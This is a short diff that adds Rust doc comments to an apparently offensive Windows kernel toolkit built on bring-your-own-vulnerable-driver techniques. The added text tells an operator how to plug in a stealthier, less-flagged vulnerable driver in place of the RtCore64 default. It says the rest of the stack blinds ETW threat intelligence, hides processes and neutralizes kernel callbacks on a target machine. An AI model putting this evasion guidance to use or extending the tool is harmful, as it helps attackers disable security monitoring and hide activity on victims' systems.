@@ -24,6 +24,20 @@
 //! reusable, testable cores. The IOCTL plumbing is driver-specific but
 //! mechanical. Only the *load* step is dangerous — and it's the one line we
 //! deliberately omit (the operator does `sc create`/`NtLoadDriver` on target).
+//!
+//! ## Plugging in an alternative driver
+//! The reference impl [`RtCore64`] is the BYOVD default. To use a different
+//! vulnerable driver (stealthier Nday, vendor-whitelisted, less IOC-flagged):
+//!
+//! 1. Implement [`VulnDriverIoctl`] for a unit struct encoding your driver's
+//!    device path + read/write IOCTL codes (override [`VulnDriverIoctl::pack`]
+//!    only if the driver's arg struct differs from the generic [`RwPacket`]).
+//! 2. Call [`crate::win::bootstrap_byovd_with`] with `Box::new(YourDriver)`
+//!    instead of the convenience [`crate::win::bootstrap_byovd`] (which
+//!    hardcodes `RtCore64`).
+//!
+//! The rest of the stack (ETW-TI blind, process hide, callback neutralize) is
+//! driver-agnostic — it operates purely on the returned `KernelRw`.
 
 use crate::{KernelRw, KrwError};
 use alloc::boxed::Box;
